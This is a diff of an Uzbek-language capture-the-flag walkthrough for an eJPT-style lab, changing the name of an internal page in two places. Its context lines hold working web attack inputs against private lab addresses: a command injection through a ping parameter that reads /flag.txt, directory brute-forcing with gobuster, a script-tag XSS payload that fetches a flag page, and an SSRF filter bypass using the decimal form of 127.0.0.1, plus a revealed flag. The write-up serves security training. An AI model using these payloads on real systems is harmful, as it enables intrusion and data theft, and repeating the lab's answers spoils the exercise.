@@ -174,7 +174,7 @@ proxychains curl "http://10.10.10.20:8080/ping?host=127.0.0.1;cat /flag.txt"
 SSH'siz nishon — brauzer + **Burp** bilan buziladi. Avval enumeratsiya (path'lar har xil ro'yxatda):
 ```bash
 gobuster dir -u http://10.10.20.60:8085/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
-#  -> download.php, search.php, fetch.php, admin-metrics.php, flag.php, login.php ...
+#  -> download.php, search.php, fetch.php, internal.php, flag.php, login.php ...
 # storage-backup common'da YO'Q — kattaroq ro'yxat kerak:
 gobuster dir -u http://10.10.20.60:8085/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt
 #  -> storage-backup/
@@ -202,7 +202,7 @@ http://10.10.20.60:8085/search.php?q=<svg onload="fetch('/flag.php').then(r=>r.t
 
 **④ SSRF + decimal bypass — `fetch.php`:** `127.0.0.1`/`localhost` satri bloklangan; 127.0.0.1 = **2130706433**:
 ```bash
-curl -s "http://10.10.20.60:8085/fetch.php?url=http://2130706433/admin-metrics.php"
+curl -s "http://10.10.20.60:8085/fetch.php?url=http://2130706433/internal.php"
 ```
 ➡️ `EJPT{ssrf_d3c1m4l_2_l0c4l}`
 
